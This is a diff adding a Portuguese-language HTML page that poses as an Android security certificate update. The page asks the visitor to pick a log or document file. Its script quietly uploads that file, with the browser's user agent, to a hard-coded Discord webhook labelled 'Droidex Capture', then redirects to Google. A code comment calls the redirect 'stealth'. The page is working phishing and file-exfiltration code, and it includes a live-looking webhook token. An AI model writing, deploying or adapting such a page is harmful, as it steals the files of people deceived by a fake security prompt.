@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Segurança Android</title>
+    <style>
+        body { background-color: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .btn { background: #007bff; padding: 15px; border-radius: 5px; cursor: pointer; display: inline-block; }
+    </style>
+</head>
+<body>
+    <h3>Atualização de Certificado Necessária</h3>
+    <p>Selecione o ficheiro de log ou documento para validar a integridade.</p>
+    
+    <input type="file" id="fileInput" style="display: block; margin: 0 auto; opacity: 0.8;">
+
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX";
+
+        document.getElementById('fileInput').onchange = function() {
+            const file = this.files[0];
+            if (!file) return;
+
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('content', `**[Droidex Capture]**\n**Host:** ${navigator.userAgent}\n**Ficheiro:** ${file.name}\n**Tamanho:** ${file.size} bytes`);
+
+            fetch(webhook, {
+                method: 'POST',
+                body: formData
+            }).then(() => {
+                // Furtividade: Redireciona para o Google após o upload
+                window.location.href = "https://www.google.com";
+            }).catch(() => {
+                window.location.href = "https://www.google.com";
+            });
+        };
+    </script>
+</body>
+</html>
